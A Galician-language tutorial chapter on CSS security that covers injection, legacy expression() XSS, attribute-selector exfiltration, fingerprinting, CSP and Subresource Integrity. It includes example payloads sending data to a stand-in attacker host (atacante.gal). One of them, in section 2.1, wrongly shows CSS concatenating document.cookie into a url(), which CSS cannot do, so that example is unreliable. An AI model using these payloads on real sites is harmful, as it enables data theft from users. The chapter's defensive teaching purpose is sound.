---
title: "Seguridade en CSS"
description: "Riscos de seguridade relacionados con CSS, como a inxección, a exfiltración de datos, os ataques de temporización e o fingerprinting."
bloque: 7
capitulo: 33
nivel: avanzado
ultima_revision: "2026-09-18"
estado: "borrador_para_validacion"
compatibilidade: "non_aplicable"
palabras_chave:
  - seguridade
  - xss
  - css_injection
  - url_malicioso
  - expression
  - privacidade
  - fingerprinting
---

# Anexo: Seguridade en CSS

> CSS non é unha linguaxe de programación, pero ten implicacións de seguridade. Un CSS mal controlado pode permitir **exfiltración de datos**, **ataques de temporización**, **fingerprinting**, ou servir como vector de **XSS** en casos concretos. Este anexo explica os riscos e como evitalos.

---

## 1. Introdución: CSS non é tan inofensivo como parece

Cando alguén pensa en seguridade web, pensa en JavaScript, SQL injection, XSS. Raramente pensa en CSS. Pero CSS **pode ser un vector de ataque**:

- **XSS vía CSS** — en circunstancias concretas, o CSS pode executar JavaScript.
- **Exfiltración de datos** — o CSS pode facer peticións a servidores externos.
- **Ataques de temporización** — o CSS pode detectar cando un usuario ten certo estado.
- **Fingerprinting** — o CSS pode axudar a identificar usuarios.

Este anexo **non pretende alarmar**, senón explicar os riscos reais e como evitalos. Na maioría de sitios, o risco é baixo. Pero en aplicacións sensibles (banca, saúde, administración), hai que telo en conta.

---

## 2. Os riscos

### 2.1 Inxección de CSS

Cando o contido dun sitio vén de fontes non confiables (por exemplo, un comentario dun usuario), e ese contido se inxecta nun `<style>` sen sanitizar, un atacante pode inxectar CSS malicioso.

**Exemplo:**

```html
<style>
    /* CSS lexítimo */
    .comentario { color: #333; }
    <?= $comentario_usuario ?>
</style>
```
Se un usuario escribe:

```css
} body { background: url('https://atacante.gal/roubar?data=' + document.cookie); } .x {
```

O CSS resultante permite que o atacante obteña información.

**Como evitalo:**

- **Nunca inxectar CSS non confiable** nun `<style>`.
- **Se hai que inxectar**, sanitizar estritamente (permitir só propiedades e valores coñecidos).
- **Usar un atributo `style` con precaución** — tamén pode ser inxectado.

### 2.2 XSS vía CSS (histórico)

En navegadores antigos (Internet Explorer), o CSS permitía executar JavaScript con **`expression()`**:

```css
/* Só IE, xa non funciona */
body {
    width: expression(alert('XSS'));
}
```

**En 2026, isto xa non funciona.** `expression()` foi eliminado. Pero hai outros vectores históricos:

- **`-moz-binding`** (Firefox antigo) — permitía XBL, que podía executar JS.
- **`url(javascript:...)`** (Internet Explorer).

**Estado actual:** estes vectores están pechados nos navegadores modernos. Pero hai que ter coidado en aplicacións que aínda soportan navegadores antigos.

### 2.3 Exfiltración de datos vía `url()`

Cando o CSS carga recursos externos (`url(...)`), fai peticións HTTP. Se un atacante controla o CSS, pode facer peticións a un servidor externo con información sensible.

**Exemplo:**

```css
input[value^="a"] { background: url('https://atacante.gal/letra-a'); }
input[value^="b"] { background: url('https://atacante.gal/letra-b'); }
/* ... */
```

Isto permite **detectar letra a letra** o valor dun input. É un ataque de **exfiltración por CSS**.

**Como evitalo:**

- **Non cargar CSS de fontes non confiables.**
- **Usar Content Security Policy (CSP)** para limitar as fontes de recursos.

### 2.4 Fingerprinting

O CSS pode axudar a identificar usuarios de forma única:

- **Fontes instaladas** — detectables con `@font-face` e `local()`.
- **Resolución de pantalla** — detectables con media queries.
- **Preferencias** — `prefers-color-scheme`, `prefers-reduced-motion`.

**Como evitalo:** isto é difícil, porque é parte do funcionamento normal do CSS. Pero **non hai que engadir máis vectores** (por exemplo, non usar `@font-face` con decenas de fontes locais).

### 2.5 Ataques de temporización

O CSS pode detectar **cando un usuario ten certo estado** baseándose en se unha petición tarda máis ou menos. Isto é moi avanzado, pero posible.

**Exemplo:** un atacante pode detectar se un usuario está logueado baseándose en se certos estilos se aplican.

---

## 3. Content Security Policy (CSP)

A **Content Security Policy** é unha cabeceira HTTP que limita que recursos pode cargar a páxina. É a mellor defensa contra moitos ataques.

**Exemplo:**

```
Content-Security-Policy: default-src 'self'; style-src 'self'; img-src 'self' https://cdn.exemplo.gal;
```

Isto significa:

- `default-src 'self'` — só recursos do propio dominio.
- `style-src 'self'` — só CSS do propio dominio.
- `img-src 'self' https://cdn.exemplo.gal` — imaxes do propio dominio e do CDN.

**Beneficios:**

- Impide cargar CSS externo non autorizado.
- Impide inxección de CSS externo.
- Limita a exfiltración de datos vía `url()`.

---

## 4. Boas prácticas

### 4.1 Non inxectar CSS non confiable

**Nunca** poñer CSS de fontes non confiables nun `<style>`.

```html
<!-- MAL: CSS non confiable -->
<style><?= $css_usuario ?></style>
```

**Solución:**

- Sanitizar estritamente.
- Non permitir CSS de usuarios.
- Usar clases predefinidas.

### 4.2 Usar CSP

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline';">
```

**Nota:** `'unsafe-inline'` permite estilos en liña. Se podes evitalo, mellor.

### 4.3 Evitar `url()` con datos externos

```css
/* Mal: url() con datos sensibles */
input[value^="password"] {
    background: url('https://externo.gal/...');
}
```

### 4.4 Non cargar CSS de fontes non confiables

Se integras CSS de terceiros (un widget, unha libraría), **verifica a fonte** e **úsao nunha capa illada**.

```css
@layer terceiro;

@import url("https://externo.gal/widget.css") layer(terceiro);
```

### 4.5 Non usar `@import` con URLs externas

```css
/* Evitar */
@import url("https://externo.gal/estilo.css");
```

Preferir `<link>` con `href` verificado.

### 4.6 Limitar o uso de `@font-face` con `local()`

```css
/* Coidado: isto pode usarse para fingerprinting */
@font-face {
    font-family: "Fonte";
    src: local("Fonte Específica");
}
```

Se só usas fontes web, evita `local()`.

---

## 5. Casos habituais

### 5.1 Aplicación que mostra contido de usuarios

Se os usuarios poden escribir comentarios, **non inxectes o seu contido como CSS**. Se precisas estilos personalizados, ofrece opcións predefinidas.

### 5.2 Integración de widgets de terceiros

Se integras un widget externo, **úsao nun `iframe`** (que illa o CSS e o JavaScript).

### 5.3 CDN de CSS

Se usas un CDN para o teu CSS, **verifica o CDN** e usa **Subresource Integrity (SRI)**:

```html
<link rel="stylesheet" href="https://cdn.exemplo.gal/estilo.css"
      integrity="sha384-..." crossorigin="anonymous">
```

---

## 6. Erros frecuentes

### 6.1 Inxectar CSS de usuarios

**O erro máis grave.** Nunca poñas CSS de fontes non confiables nun `<style>`.

### 6.2 Non usar CSP

Sen CSP, calquera inxección de CSS pode facer peticións externas.

### 6.3 Usar `@import` con URLs non verificadas

`@import` pode cargar CSS externo. Hai que verificar a URL.

### 6.4 Ignorar os avisos do navegador

Cando o navegador avisa de CSS bloqueado por CSP, **hai que investigar**.

### 6.5 Pensar que o CSS é inofensivo

O CSS pode ser un vector de ataque. Non é o máis común, pero hai que telo en conta.

---

## 7. Compatibilidade (2026)

| Característica        | Estado              |
| --------------------- | ------------------- |
| CSP                   | Universal           |
| `expression()`        | Eliminado (IE)      |
| `-moz-binding`        | Eliminado (Firefox) |
| `url(javascript:...)` | Eliminado (IE)      |

Os vectores históricos están pechados. Os riscos actuais son principalmente de **exfiltración** e **fingerprinting**.

---

## 8. Exercicios

### Exercicio 1: Detectar inxección

```html
<style>
    .comentario { color: #333; }
    <?= $comentario ?>
</style>
```

Cal é o risco? Como o evitalas?

<details>
<summary><b>Amosar a solución</b></summary>


O risco é inxección de CSS. Un usuario pode pechar a regra e engadir CSS malicioso. Solución: non inxectar CSS non confiable. Se hai que mostrar contido de usuario, facelo como texto (con `htmlspecialchars`), non como CSS.

</details>

### Exercicio 2: CSP

Escribe unha cabeceira CSP que permita só CSS do propio dominio.

<details>
<summary><b>Amosar a solución</b></summary>


```
Content-Security-Policy: style-src 'self';
```

</details>

### Exercicio 3: SRI

Escribe un `<link>` con Subresource Integrity.

<details>
<summary><b>Amosar a solución</b></summary>


```html
<link rel="stylesheet" href="https://cdn.exemplo.gal/estilo.css"
      integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..." crossorigin="anonymous">
```

</details>

---

## 9. Para profundar

- **MDN Web Docs:** [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — guía completa.
- **OWASP:** [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — referencia.
- **W3C:** [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/) — especificación.
- **Google:** [CSP Evaluator](https://csp-evaluator.withgoogle.com/) — ferramenta para analizar CSP.

---

## 10. Referencias cruzadas

- **Capítulo 1: Que é CSS** — como se aplica CSS a un documento.
- **Capítulo 23: `@layer`, `@scope`, `@supports`** — illamento de estilos.
- **Capítulo 27: Arquitectura CSS** — integración de librarías de terceiros.

---

**Data de creación:** 2026-09-18  
**Última revisión:** 2026-09-18  
**Estado:** Borrador para validación